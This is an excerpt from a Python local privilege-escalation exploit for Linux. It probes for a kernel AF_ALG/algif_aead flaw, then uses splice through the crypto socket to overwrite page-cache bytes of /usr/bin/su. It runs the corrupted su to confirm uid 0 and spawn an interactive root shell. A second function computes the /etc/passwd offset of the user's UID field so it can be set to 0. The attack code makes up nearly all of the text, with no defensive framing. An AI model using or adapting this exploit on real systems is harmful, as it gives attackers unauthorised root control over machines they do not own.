...
def check_vulnerable():
    ...
    try:
        # algif_aead may be built-in (no module file exists) - informational only.
        # The real gate is the AF_ALG socket+bind probe below.
        if os.system("modinfo algif_aead >/dev/null 2>&1") != 0:
            print("[*] algif_aead has no loadable module (likely built-in) - probing socket anyway")
        ...
        if fd < 0:
            print(f"[-] Cannot open AF_ALG socket ({os.strerror(ctypes.get_errno())})")
            return False
...
def exploit(target_path=TARGET_BIN, offset=DEFAULT_OFFSET, write_byte=DEFAULT_BYTE):
    ...
    if fd_target < 0:
        print(f"[-] Cannot open {target_path}: {os.strerror(ctypes.get_errno())}")
        return False
    ...
    if fd_alg < 0:
        print(f"[-] socket(AF_ALG): {os.strerror(ctypes.get_errno())}")
    ...
    if ret < 0:
        print(f"[-] bind(AF_ALG): {os.strerror(ctypes.get_errno())}")
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    ...
    if fd_oper < 0:
        print(f"[-] accept(AF_ALG): {os.strerror(ctypes.get_errno())}")
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    ...
    if ret < 0:
        print(f"[-] setsockopt(ALG_SET_KEY): {os.strerror(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    ...
    if written_iv < 0:
        print(f"[-] write(header): {os.strerror(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    ...
    if spliced < 0:
        print(f"[-] splice: {os.strerror(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    ...
    if nread < 0:
        print(f"[-] read(operfd): {os.strerror(ctypes.get_errno())}")
    else:
...
def trigger_setuid_root():
    """Execute the corrupted /usr/bin/su binary to get root - VERIFIED."""
    print("[*] Attempting to execute corrupted su binary...")
    try:
        # The corrupted su will grant root because the page cache has been patched.
        # Only report success when the output actually shows uid=0.
        out = os.popen("echo 'id' | " + TARGET_BIN + " -c 'id' 2>&1").read().strip()
        if "uid=0(root)" in out:
            print("[!] SUCCESS: Corrupted su granted root!")
            os.system("echo 'exec /bin/bash -i' | " + TARGET_BIN + " -c 'exec /bin/bash -i' 2>/dev/null &")
            return True
        print("[-] su did not grant root (output: %s)" % out[:120])
    except Exception as e:
...
def exploit_passwd_corruption(new_uid=0, new_gid=0):
    ...
    if not our_index is None:
        ...
        # Calculate offset: line start (absolute file offset) + UID field position
        fields = our_line.split(":")
        if len(fields) >= 3:
            uid_field_pos = len(":".join(fields[:2])) + 1  # after username:x:
            line_start = sum(len(l) for l in lines[:our_index])
            offset = line_start + uid_field_pos

            # We want to write "0\0\0\0" to set uid to 0
            print(f"[+] Absolute passwd offset for UID field: {offset}")
